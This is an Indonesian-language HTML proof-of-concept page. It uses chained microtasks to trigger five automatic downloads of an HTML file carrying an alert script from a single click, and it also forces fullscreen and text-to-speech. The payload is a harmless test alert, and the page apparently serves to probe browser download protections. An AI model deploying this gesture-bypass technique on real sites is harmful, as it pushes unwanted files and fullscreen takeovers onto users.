<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Blob ObjectURL — Race Condition Download</title>
<style>
* {
box-sizing: border-box;
margin: 0;
padding: 0;
}
body {
font-family: Arial, sans-serif;
background: #f4f6f8;
color: #222;
padding: 20px;
}
.panel {
background: #ffffff;
padding: 24px;
border-radius: 12px;
box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
max-width: 600px;
margin: 40px auto;
}
:fullscreen {
background: #111111 !important;
color: #00ff00 !important;
padding: 20px !important;
overflow-y: auto !important;
width: 100vw !important;
height: 100vh !important;
}
:-webkit-full-screen {
background: #111111 !important;
color: #00ff00 !important;
padding: 20px !important;
overflow-y: auto !important;
}
h2 {
margin-bottom: 10px;
}
p {
margin-bottom: 15px;
line-height: 1.5;
}
button {
width: 100%;
padding: 16px;
cursor: pointer;
border: none;
border-radius: 6px;
background: #d32f2f;
color: #ffffff;
font-weight: bold;
font-size: 16px;
box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
transition: background 0.2s;
}
button:hover {
background: #b71c1c;
}
button:disabled {
background: #9e9e9e;
cursor: not-allowed;
}
#status {
margin-top: 16px;
font-weight: bold;
color: #d32f2f;
padding: 12px;
background: #ffebee;
border-radius: 6px;
text-align: center;
border: 1px solid #ffcdd2;
}
#counter {
margin-top: 12px;
font-family: monospace;
font-size: 14px;
text-align: center;
color: #555;
}
#downloads {
margin-top: 20px;
display: grid;
grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
gap: 10px;
}
#downloads a {
display: block;
padding: 8px;
background: #212121;
color: #80df82;
text-decoration: none;
border-radius: 4px;
font-size: 12px;
text-align: center;
border: 1px solid #424242;
word-break: break-all;
}
</style>
</head>
<body>

<div class="panel" id="main-panel">
<h2>Blob ObjectURL — Race Condition Download</h2>
<p>Satu klik tombol = satu gesture user. Teknik race condition memanfaatkan microtask &amp; task scheduling agar browser menganggap semua unduhan berasal dari gesture yang sama, sehingga memicu lebih dari 1 unduhan sekaligus.</p>
<button id="start-btn" type="button">Mulai Layar Penuh &amp; Race Download</button>
<div id="status" role="status">Sistem siap.</div>
<div id="counter">Unduhan dipicu: 0</div>
<div id="downloads"></div>
</div>

<script>
var startBtn = document.getElementById("start-btn");
var statusDiv = document.getElementById("status");
var downloadsDiv = document.getElementById("downloads");
var counterDiv = document.getElementById("counter");

var activeUrls = [];
var isProcessing = false;
var totalTarget = 5;

var speak = function(message) {
if ('speechSynthesis' in window) {
try {
window.speechSynthesis.cancel();
var utterance = new SpeechSynthesisUtterance(message);
utterance.lang = 'id-ID';
utterance.rate = 1.0;
window.speechSynthesis.speak(utterance);
} catch (e) {
console.warn("TTS gagal:", e);
}
}
};

var payloadText = '<html><body><h1>Test Vulnerability</h1>' +
'<script>alert("Origin: " + document.origin)<\/script>' +
'</body></html>';

function buatBlobUrl(id) {
var blob = new Blob([payloadText], { type: "application/octet-stream" });
var url = URL.createObjectURL(blob);
activeUrls.push(url);
return url;
}

function triggerDownload(url, id, label) {
var a = document.createElement("a");
a.href = url;
a.download = "race-file-" + String(id).padStart(3, '0') + ".txt";
a.textContent = label;
a.style.display = "none";
downloadsDiv.appendChild(a);
a.click();
}

function updateCounter(n) {
counterDiv.textContent = "Unduhan dipicu: " + n;
}

function masukFullscreen() {
var root = document.documentElement;
try {
if (root.requestFullscreen) {
var p = root.requestFullscreen();
if (p && p.catch) p.catch(function() {});
} else if (root.webkitRequestFullscreen) {
root.webkitRequestFullscreen();
} else if (root.mozRequestFullScreen) {
root.mozRequestFullScreen();
}
} catch (err) {
console.warn("Fullscreen gagal:", err);
}
}

function jalankanRaceCondition() {
if (isProcessing) return;
isProcessing = true;

activeUrls.forEach(function(u) { URL.revokeObjectURL(u); });
activeUrls = [];
downloadsDiv.replaceChildren();
updateCounter(0);

statusDiv.textContent = "Memicu race condition...";

masukFullscreen();

var dipicu = 0;

function picuSatu() {
if (dipicu >= totalTarget) {
statusDiv.textContent = "Selesai. " + dipicu + " unduhan dipicu dari 1 klik.";
isProcessing = false;
startBtn.disabled = false;
speak("Race condition selesai. " + dipicu + " unduhan dipicu.");
return;
}
dipicu++;
var url = buatBlobUrl(dipicu);
triggerDownload(url, dipicu, "Race #" + dipicu);
updateCounter(dipicu);
statusDiv.textContent = "Memproses ke-" + dipicu + " dari " + totalTarget;
queueMicrotask(picuSatu);
}

queueMicrotask(function() {
queueMicrotask(function() {
queueMicrotask(function() {
picuSatu();
});
});
});
}

startBtn.addEventListener("click", function() {
if (isProcessing) return;
startBtn.disabled = true;
speak("Memulai race condition download.");
jalankanRaceCondition();
});

updateCounter(0);
</script>

</body>
</html>
